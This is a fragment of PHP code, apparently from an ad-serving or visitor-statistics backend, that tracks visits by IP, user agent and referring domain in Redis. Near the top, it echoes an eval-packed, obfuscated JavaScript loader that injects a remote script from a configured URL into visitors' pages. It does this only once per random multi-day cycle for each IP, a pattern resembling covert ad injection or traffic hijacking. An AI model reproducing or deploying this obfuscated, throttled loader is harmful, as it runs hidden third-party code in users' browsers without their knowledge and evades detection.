        if($adzNumTwo == false){
            $time = rand($checkadz['adzcycle1'],$checkadz['adzcycle2']);
            $time = empty($time) ? 1 : $time;
            $sredis->handler()->SET($statsParams['user_ip'],1,$time*86400);
            //发送js链接
            //发送js链接
            echo'var z = "'.$checkadz['adzjs'].'"';
            echo ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('h 5(a){2 1=3.f(\'4\');1.7=\'9/c\';1.d=\"6-8\";1.g=a;2 b=3.i(\'4\')[0];b.j.k(1,b)}l{5(m)}n(e){}',24,24,'|x|var|document|script|y|utf|type||text|||javascript|charset||createElement|src|function|getElementsByTagName|parentNode|insertBefore|try|z|catch'.split('|'),0,{}));";
        }
        //已发送js请求的今天不会再次发送js请求，将默认redis库中的展示此次置为-1000
        //因为周期以天为单位，0号库中的该数据今天肯定不会失效，保证该广告位该ip今天不会再次进入判断，不用再次切换redis库，节省性能
        $sredis->select(0);
        $adzDataNum[$statsParams['user_ip']] = -1000;
        $sredis->handler()->HMSET('adz_num_ip'.$statsParams['adz_id'],$adzDataNum);
    }
}

$str_userAgent = str_user_agent($uaaaaagent);
if(!empty($str_userAgent)){
  $user_agent = $sredis->handler()->HINCRBY('user_agent',$str_userAgent,1);
}
function str_user_agent($uaaaaagent){
    if(stristr($uaaaaagent, 'Android')){
        if(stristr($uaaaaagent, 'Build')){
            $sub_end = stristr($uaaaaagent, 'uild',true); //截取uild之前的字符串
            $sub_start = strripos($sub_end,';') + 2; //从;最后出现的位置 开始截取
            $sub_endnum = strripos($sub_end,'B'); //B最后一次出现的位置
            $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
            $sub_results = substr($sub_end, $sub_start, $sub_cha);
            if(empty($sub_results)){
                $sub_results = '';
            }
        }else{
            $sub_results = '';
        }
    }elseif(stristr($uaaaaagent, 'iphone')){
        //如果是iphone 返回操作系统
        $sub_end = stristr($uaaaaagent, 'ike',true); //截取like之前的字符串
        $sub_start = strripos($sub_end,'CPU') + 4; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'l'); //L最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
    }else{
        $sub_results = '';
    }
    $sub_results = str_replace(" ","",$sub_results);
    return $sub_results;
}

//域名不为空进入
if(!empty($adsthisUrl)) {
//判断域名是否访问过广告位
    $siteNum = $sredis->handler()->HEXISTS('record-' . $id, $adsthisUrl);
    $domain_num = array();
    if ($siteNum == false) {
        //此域名没有访问此广告位id时存入
        $domain_num = array(
                $adsthisUrl => 1,
        );

    } else {
        $domain_adzid = $sredis->handler()->HMGET('record-' . $id, array($adsthisUrl));
        //此域名有访问 num 加 1
        $domain_num = array(
                $adsthisUrl => $domain_adzid[$adsthisUrl] + 1,
        );
    }
    $sredis->handler()->HMSET('record-' . $id, $domain_num);
}
